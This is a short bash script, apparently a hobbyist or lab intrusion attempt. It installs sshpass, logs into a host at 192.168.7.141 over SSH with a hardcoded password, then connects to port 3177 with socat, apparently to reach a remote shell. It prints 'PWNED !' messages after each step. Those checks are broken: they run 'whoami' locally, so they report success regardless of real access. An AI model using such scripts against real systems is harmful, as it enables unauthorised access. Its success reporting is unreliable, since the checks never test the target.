#!/usr/bin/env bash
echo "Start listening "
#######################
#First check for ssh connection
username=user
TARGET_IP=192.168.7.141
#ssh $username@$TARGET_IP -p 22
#going to try something new here
###########################
sudo apt-get install sshpass -y
sshpass -p 'password' ssh $username@$TARGET_IP -p 22
if [ $(whoami) != 'pkvirus' ]; then
    echo "PWNED ! SSH is good "

else
  echo "No SSH access"
fi
#############################
echo "Trying Socat access .. . "
socat STDIO TCP4:192.168.7.141:3177 #access Socat
if [ $(whoami) != 'pkvirus' ]; then
    echo "PWNED ! Socat is good "
else
  echo "No socat access"
fi
##############################
